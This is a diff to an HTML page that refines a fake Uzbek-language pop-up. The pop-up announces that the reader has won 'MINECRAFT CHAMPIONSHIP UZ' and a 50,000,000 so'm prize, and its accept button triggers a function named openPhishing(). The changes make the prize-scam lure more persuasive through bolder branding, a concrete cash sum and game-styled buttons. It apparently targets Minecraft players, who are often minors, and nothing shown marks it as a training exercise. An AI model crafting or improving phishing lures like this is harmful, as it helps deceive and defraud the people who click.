@@ -43,6 +43,7 @@
       letter-spacing: 8px;
       z-index: 0;
       user-select: none;
+      font-family: 'Courier New', monospace;
     }
 
     /* Waiting indicator */
@@ -101,14 +102,16 @@
     }
 
     .notif-icon {
-      width: 40px; height: 40px;
-      border-radius: 8px;
+      width: 44px; height: 44px;
+      border-radius: 6px;
       background: linear-gradient(135deg, #1b5e20, #2e7d32);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 1.4rem;
+      font-size: 1.6rem;
       flex-shrink: 0;
+      border: 2px solid #4caf50;
+      box-shadow: 0 0 12px rgba(76,175,80,.4);
     }
 
     .notif-body { flex: 1; }
@@ -148,35 +151,44 @@
     .notif-actions {
       display: flex;
       gap: 8px;
-      margin-top: 10px;
+      margin-top: 12px;
     }
 
     .btn-view {
-      background: #00c853;
-      color: #000;
+      background: linear-gradient(180deg, #4caf50 0%, #2e7d32 100%);
+      color: #fff;
       border: none;
-      padding: 5px 14px;
-      border-radius: 4px;
+      border-bottom: 3px solid #1b5e20;
+      padding: 6px 16px;
+      border-radius: 3px;
       font-size: .78rem;
-      font-weight: 700;
+      font-weight: 900;
       cursor: pointer;
-      font-family: inherit;
-      transition: background .15s;
+      font-family: 'Courier New', monospace;
+      letter-spacing: .5px;
+      text-transform: uppercase;
+      transition: filter .1s, transform .1s;
+      text-shadow: 0 1px 2px rgba(0,0,0,.5);
     }
-    .btn-view:hover { background: #69f0ae; }
+    .btn-view:hover  { filter: brightness(1.15); }
+    .btn-view:active { transform: translateY(2px); border-bottom-width: 1px; }
 
     .btn-dismiss {
-      background: transparent;
-      color: #666;
-      border: 1px solid #333;
-      padding: 5px 12px;
-      border-radius: 4px;
+      background: linear-gradient(180deg, #555 0%, #333 100%);
+      color: #bbb;
+      border: none;
+      border-bottom: 3px solid #111;
+      padding: 6px 12px;
+      border-radius: 3px;
       font-size: .78rem;
       cursor: pointer;
-      font-family: inherit;
-      transition: all .15s;
+      font-family: 'Courier New', monospace;
+      letter-spacing: .5px;
+      text-transform: uppercase;
+      transition: filter .1s, transform .1s;
     }
-    .btn-dismiss:hover { border-color: #666; color: #aaa; }
+    .btn-dismiss:hover  { filter: brightness(1.2); }
+    .btn-dismiss:active { transform: translateY(2px); border-bottom-width: 1px; }
 
     .notif-time {
       position: absolute;
@@ -205,17 +217,18 @@
 </div>
 
 <div class="notif" id="notif">
-  <div class="notif-icon">🎮</div>
+  <div class="notif-icon">⛏️</div>
   <div class="notif-body">
-    <div class="notif-app"><span class="pulse"></span>Minecraft Server Events</div>
-    <div class="notif-title">🏆 Tabriklaymiz, o'yinchi!</div>
+    <div class="notif-app"><span class="pulse"></span>MINECRAFT CHAMPIONSHIP UZ 🇺🇿</div>
+    <div class="notif-title">🏆 TABRIKLAYMIZ!</div>
     <div class="notif-text">
-      Siz <strong style="color:#ffd600;">pul mukofotiga</strong> ega bo'ldingiz.<br>
-      Mukofotingizni darhol qo'lga kiriting!
+      Siz <strong style="color:#ffd600;">"MINECRAFT CHAMPIONSHIP UZ"</strong> musobaqasining<br>
+      <strong style="color:#00e676;">G'OLIBI</strong> bo'ldingiz! Yutuq: <strong style="color:#ffd600;">50 000 000 so'm</strong><br>
+      <span style="color:#aaa;">Mukofotni olish uchun — bu yerga bosing.</span>
     </div>
     <div class="notif-actions">
-      <button class="btn-view" onclick="openPhishing(); event.stopPropagation()">Ko'rish</button>
-      <button class="btn-dismiss" onclick="dismiss(); event.stopPropagation()">Keyinroq</button>
+      <button class="btn-view" onclick="openPhishing(); event.stopPropagation()">✅ Qabul qilish</button>
+      <button class="btn-dismiss" onclick="dismiss(); event.stopPropagation()">O'tkazib yuborish</button>
     </div>
   </div>
   <div class="notif-time" id="notifTime"></div>
